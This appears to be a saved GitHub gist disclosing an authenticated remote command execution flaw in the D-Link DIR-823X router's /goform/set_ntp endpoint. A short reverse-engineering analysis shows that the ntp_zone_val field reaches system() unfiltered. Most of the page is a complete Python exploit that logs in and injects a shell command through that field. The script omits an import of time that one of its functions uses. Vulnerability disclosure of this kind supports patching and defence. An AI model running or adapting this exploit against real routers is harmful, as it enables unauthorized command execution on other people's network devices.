=== Content from gist.github.com_31d4680b_20250111_040557.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Swind1er](https://avatars.githubusercontent.com/u/100978844?s=64&v=4)](/Swind1er)

# [Swind1er](/Swind1er)/**[D-Link DIR-823X AX3000 Dual-Band Gigabit Wireless Router Remote Command Execution POC.md](/Swind1er/40c33f1b1549028677cb4e2e5ef69109)**

Last active
December 12, 2024 16:21

Show Gist options

* [Download ZIP](/Swind1er/40c33f1b1549028677cb4e2e5ef69109/archive/6178b0809b57eedc28a4b1b8fd4892fb9aa79ebb.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109)You must be signed in to star a gist
* [Fork
  (2)
  2](/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Swind1er/40c33f1b1549028677cb4e2e5ef69109.js&quot;&gt;&lt;/script&gt;
* Save Swind1er/40c33f1b1549028677cb4e2e5ef69109 to your computer and use it in GitHub Desktop.

[Code](/Swind1er/40c33f1b1549028677cb4e2e5ef69109)
[Revisions
2](/Swind1er/40c33f1b1549028677cb4e2e5ef69109/revisions)
[Stars
1](/Swind1er/40c33f1b1549028677cb4e2e5ef69109/stargazers)
[Forks
2](/Swind1er/40c33f1b1549028677cb4e2e5ef69109/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Swind1er/40c33f1b1549028677cb4e2e5ef69109.js&quot;&gt;&lt;/script&gt;

Save Swind1er/40c33f1b1549028677cb4e2e5ef69109 to your computer and use it in GitHub Desktop.

[Download ZIP](/Swind1er/40c33f1b1549028677cb4e2e5ef69109/archive/6178b0809b57eedc28a4b1b8fd4892fb9aa79ebb.zip)

 [Raw](/Swind1er/40c33f1b1549028677cb4e2e5ef69109/raw/6178b0809b57eedc28a4b1b8fd4892fb9aa79ebb/D-Link%2520DIR-823X%2520AX3000%2520Dual-Band%2520Gigabit%2520Wireless%2520Router%2520Remote%2520Command%2520Execution%2520POC.md)

[**D-Link DIR-823X AX3000 Dual-Band Gigabit Wireless Router Remote Command Execution POC.md**](#file-d-link-dir-823x-ax3000-dual-band-gigabit-wireless-router-remote-command-execution-poc-md)

# D-Link DIR-823X AX3000 Dual-Band Gigabit Wireless Router Remote Command Execution POC

## Manufacturer's official website

[D-Link | Welcome (dlink.com.cn)](http://www.dlink.com.cn/)

## Device model

DIR-823X AX3000 Dual-Band Gigabit Wireless Router

## Firmware version

[固件-240126](http://www.dlink.com.cn/download.ashx?id=3E012425BDE5E8758B6B29FD8C1C94E3E88F4ABDA14D751500AAD11EDE0BFFA340749746BF23A80A718B6985CBEDC4230BA63126FD5AF277FBD066C78DFEAD0FEA0CD92BFE953F0D&type=0A1CED5533FEE8856B6B79FFCEE286AA)

## Vulnerability type

[RCE] Remote Command Execution with Authorization

## Vulnerability Description

In this firmware version, the web server is not properly handling the `ntp_zone_val` field in the CGI request for `/goform/set_ntp`. This allows an attacker to craft a malicious `ntp_zone_val` field and send a malicious HTTP request to the `/goform/set_ntp` CGI, leading to command execution with administrator privileges on the firmware file system.

## Make your life simpler

<https://github.com/Swind1er/Video/raw/main/set_ntp.mp4>

## Vulnerability Analysis

First, locate the corresponding CGI processing function for the `/goform/set_ntp` request: `sub_41D618`, as follows

[![image-20240621144216573](https://camo.githubusercontent.com/346d44321a888427a7c7ad1627a313acd49d71e94a242d27c87254f5d60f954a/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363231313434323637352e706e67)](https://camo.githubusercontent.com/346d44321a888427a7c7ad1627a313acd49d71e94a242d27c87254f5d60f954a/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363231313434323637352e706e67)

Following `sub_41D618`, we see the uci processing function `uciSet`, RVA:`0x0000041D7C4`, continue tracking

[![image-20240621144304177](https://camo.githubusercontent.com/3ae86180af9eda9be4d1edd283f2a257a5ee4e6e68a02479be767f3db25fdf2a/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363231313434333234352e706e67)](https://camo.githubusercontent.com/3ae86180af9eda9be4d1edd283f2a257a5ee4e6e68a02479be767f3db25fdf2a/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363231313434333234352e706e67)

A simple format string can be seen. Continue tracking the function `sub_412B04`

[![image-20240618144855583](https://camo.githubusercontent.com/0c0dbc542aeb8b0f862d35aa41bacf476562f45d227ecdab47b647c50807bdd4/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363138313434383631302e706e67)](https://camo.githubusercontent.com/0c0dbc542aeb8b0f862d35aa41bacf476562f45d227ecdab47b647c50807bdd4/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363138313434383631302e706e67)

In the `sub_412B04` function, the formatted string is directly executed using the `system` function. The entire call chain does not filter the parameters, as shown below:

[![image-20240618145123599](https://camo.githubusercontent.com/aad2de9218bf8fb1cded221fa648205820f986fdc12948b89610d8a14ebadb62/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363138313435313633392e706e67)](https://camo.githubusercontent.com/aad2de9218bf8fb1cded221fa648205820f986fdc12948b89610d8a14ebadb62/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363138313435313633392e706e67)

For the following format string, the parameter `a1` is uncontrollable, and there are many ways to exploit parameter `a2`. Here, we simply use double quotes to enclose and add a semicolon for execution. See the exploit details below.

```
sub_412B04("/sbin/uci set %s=\"%s\"", a1, a2);
```

## EXP

```
# -*- coding: utf-8 -*-
"""
HTTP POST Request Example.

MIT License

Copyright (c) 2024 Swind1er

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import requests
import logging
import argparse
import re
import hmac
import hashlib

__author__ = "Yaxuan Wang(Sw1ndl3r)"
__email__ = "2532775668@qq.com"

logging.basicConfig(level=logging.DEBUG)

def get_current_timestamp():
    return str(int(time.time()))

def extract_cookies_from_response(response):
    cookies = response.headers.get('Set-Cookie', '')
    sessionid = re.search(r'sessionid=([^;]+)', cookies)
    token = re.search(r'token=([^;]+)', cookies)
    sessionid = sessionid.group(1) if sessionid else None
    token = token.group(1) if token else None
    return sessionid, token

def send_get_login_page(session, host_ip):
    url = f"http://{host_ip}/login.html"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    response = session.get(url, headers=headers)

    if response.status_code == 200:
        sessionid, token = extract_cookies_from_response(response)
        return sessionid, token
    else:
        logging.error("Failed to get login page.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")
        return None, None

def hash_password(password, token):
    hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
    url = f"http://{host_ip}/goform/login"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }

    payload = {
        "username": username,
        "password": hashed_password,
        "token": token
    }

    response = session.post(url, headers=headers, data=payload)

    return response

def send_set_ntp_request(session, host_ip, sessionid, token):
    url = f"http://{host_ip}/goform/set_ntp"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }

    payload = {
        "ntp_zone_val": ";echo \"exp_set_ntp.py\">>/tmp/showme.txt;",
        "ntp_zone_name": "123",
        "ntp_client": "1",
        "token": token
    }

    response = session.post(url, headers=headers, data=payload)

    return response

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.0.1', help='Host IP address.')
    parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')

    args = parser.parse_args()

    logging.info(f'Author: {__author__}, email: {__email__}')
    logging.info(f'Host IP: {args.host}')

    # Get login page
    sessionid, token = send_get_login_page(session, args.host)
    if sessionid and token:
        logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")

        # Hash the password
        hashed_password = hash_password(args.password, token)

        # Send login request
        response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
        if response.status_code == 200:
            logging.info("Login request sent successfully.")
            logging.debug(f"Response: {response.text}")

            # Extract updated sessionid and token from login response
            sessionid, token = extract_cookies_from_response(response)

            # Send LAN settings request
            response = send_set_ntp_request(session, args.host, sessionid, token)
            if response.status_code == 200:
                logging.info("LAN settings request sent successfully.")
                logging.debug(f"Response: {response.text}")
            else:
                logging.error("Failed to send LAN settings request.")
                logging.error(f"Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        else:
            logging.error("Failed to send login request.")
            logging.error(f"Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    else:
        logging.error("Failed to retrieve sessionid and token from login page.")

if __name__ == "__main__":
    main()
```

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2F40c33f1b1549028677cb4e2e5ef69109)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


